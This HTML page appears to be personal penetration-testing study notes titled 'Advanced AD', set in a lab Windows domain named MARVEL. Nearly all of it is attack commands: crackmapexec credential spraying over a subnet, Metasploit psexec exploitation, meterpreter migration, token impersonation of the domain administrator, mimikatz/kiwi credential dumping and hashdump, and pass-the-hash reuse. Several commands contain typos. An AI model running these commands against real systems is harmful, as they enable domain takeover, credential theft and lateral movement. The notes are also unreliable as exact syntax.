<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Advanced AD</title>
</head><body><b><span style="font-size: 18pt">Some Blog Post</span></b><br/>
<br/>
<br/>
<img src="2020-04-18 18_08_45.png" /><br/>
<br/>
<br/>
<br/>
<br/>
<span style="font-size: 18pt"><b>Certificate Courses</b></span><br/>
<br/>
<br/>
<br/>
<img src="2020-04-18 18_30_03.png" /><br/>
<br/>
<br/>
<br/>
<br/>
<span style="color: #ff0000">apt install crackmapexec </span><br/>
<span style="color: #ff0000">crackmapexec smb 198.168.202.0/24 -u Administrator -p 'type_password' -d MARVEL</span>&nbsp;when you have cracked the credential use it to see where you have access<br/>
<br/>
Finally run metasploit<br/>
<b><span style="font-size: 18pt">Metasploit<br/>
</span></b><br/>
<span style="color: #ff0000">msfconsole<br/>
use exploit/windows/smb/psexec<br/>
options for brief info<br/>
set rhosts 198.168.202.134<br/>
set smbdomain marvel<br/>
set smbpass Password1<br/>
set smbuser fcastle<br/>
</span><span style="color: #ff0000">show targets </span><span style="color: #000000">showing the number of available exploits</span><span style="color: #ff0000"><br/>
</span><span style="color: #ff0000">set target 2 </span><span style="color: #000000">for setting the exploit to native upload</span><br/>
<span style="color: #ff0000">run</span><br/>
<span style="color: #ff0000">set target 1</span>&nbsp;for setting the exploit to powershell if native upload doesnot work do not use the target automatic<br/>
<span style="color: #ff0000">getuid</span>&nbsp;type this command in the meterpreter for getting the server name<span style="color: #000000"><br/>
</span><span style="color: #ff0000">sysinfo</span><span style="color: #000000">&nbsp;for getting information about the system and find the bit of the meterpreter shell like 'x86' which is 32bit, so this needs improvement to 64bit as the architecture is on 'x64' 64bit<br/>
</span><span style="color: #ff0000">background</span>&nbsp;for running the session in the background<br/>
<span style="color: #ff0000">set payload windows/meterpreter/</span>&nbsp;press double tab to look for the available payloads<br/>
<span style="color: #ff0000">sessions</span>&nbsp;to see the number of session<br/>
<span style="color: #ff0000">session 1 </span>to go back to the initial session<br/>
<span style="color: #ff0000">ps</span>&nbsp;to look at the number of process available<br/>
<span style="color: #ff0000">migrate 1076</span>&nbsp;from the list of process use this (this is a guessing game if things don't work out, the machine needs to be rebooted)<br/>
<span style="color: #ff0000">help </span>for finding out the things that can be done with the meterpreter session but nothing will work unless the migration of the shell from 32bit to 64bit is done<br/>
<span style="color: #ff0000">load incognito</span>&nbsp;<br/>
<span style="color: #ff0000">help </span>to find out the command that could be used here<br/>
<br/>
<b><span style="font-size: 18pt">Token Impersonation<br/>
</span></b><br/>
<span style="color: #ff0000">list_tokens -g<br/>
getuid<br/>
impersonate_token MARVEL\\Administrator<br/>
getuid<br/>
</span><span style="color: #ff0000">shell</span><br/>
<span style="color: #ff0000">net group "Domain Admins"</span>&nbsp;this command can only be used in windows domain controller (not command is not available)<br/>
<span style="color: #ff0000">load</span>&nbsp;to see all the features that can be used to load into<br/>
<br/>
<b><span style="font-size: 18pt"><br/>
<br/>
</span></b><b><span style="font-size: 18pt">METERPRETER</span></b><br/>
<span style="color: #ff0000">load kiwi <br/>
</span><span style="color: #ff0000">creds_all</span><br/>
<br/>
<br/>
<span style="color: #ff0000">rev2self</span>&nbsp;to reverse back to the user in the beginning<br/>
<span style="color: #ff0000">getuid</span>&nbsp;to check if the previous command actually worked<br/>
<br/>
<br/>
<span style="color: #ff0000">load mimikatz</span>&nbsp;to load a 32bit shell in a 64bit architecture<br/>
<span style="color: #ff0000">help</span>&nbsp;to look into the menu<br/>
<span style="color: #ff0000">kerberos</span><br/>
<br/>
<span style="color: #ff0000">background</span>&nbsp;the meterpreter session is running in the background but this will switch to metasploit<br/>
<span style="color: #ff0000">sessions</span>&nbsp;to see that the meterpreter session is running in the background<br/>
<br/>
<span style="color: #ff0000">use post/multi/recon/local_exploit_suggeste</span>r after the exploit is done this is the post command that can be used<br/>
<span style="color: #ff0000">options</span>&nbsp;to the methods that are available<br/>
<br/>
<span style="color: #ff0000">set session 1 <br/>
run<br/>
<br/>
<br/>
session 1<br/>
</span><span style="color: #ff0000">ps</span>&nbsp;for list of options for migration<br/>
<span style="color: #ff0000">migrate 1076</span>&nbsp;<span style="color: #000000">for migration into 64bit shell</span><span style="color: #ff0000"><br/>
</span><span style="color: #000000"><br/>
</span><span style="color: #ff0000">sysinfo</span><span style="color: #000000">&nbsp;to check if the meterpreter shell and the architecture are both of 64bit<br/>
</span><span style="color: #ff0000">hashdump</span><span style="color: #000000">&nbsp;for dumping all of the hashes</span><span style="color: #ff0000"><br/>
</span><span style="color: #000000"><br/>
</span>______________________________________________________________________________________<span style="color: #000000"><br/>
</span><span style="color: #000000"><b><span style="font-size: 18pt">Cracking the hash<br/>
</span></b></span><br/>
<span style="color: #ff0000">crackmapexec smb 192.168.202.0/24 -u Administrator -H put_your_hash_after_colon_of_first_number<br/>
crackmapexec smb 192.168.202.0/24 -u Administrator -H put_your_hash_after_colon_of_first_number<br/>
</span><span style="color: #ff0000">crackmapexec smb 192.168.202.134 -u Frank -H put_your_hash_after_colon_of_first_number</span><br/>
<br/>
______________________________________________________________________________________<br/>
<br/>
<span style="color: #ff0000">backgroud</span>&nbsp;put the meterpreter session in background<br/>
<br/>
<span style="color: #ff0000">use exploit/windows/smb/psexec <br/>
unset smbdomain in the exploit<br/>
set smbuser Frank<br/>
ser smbpass hash_of _Frank<br/>
</span><span style="color: #ff0000">run</span>&nbsp;for running the exploit<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>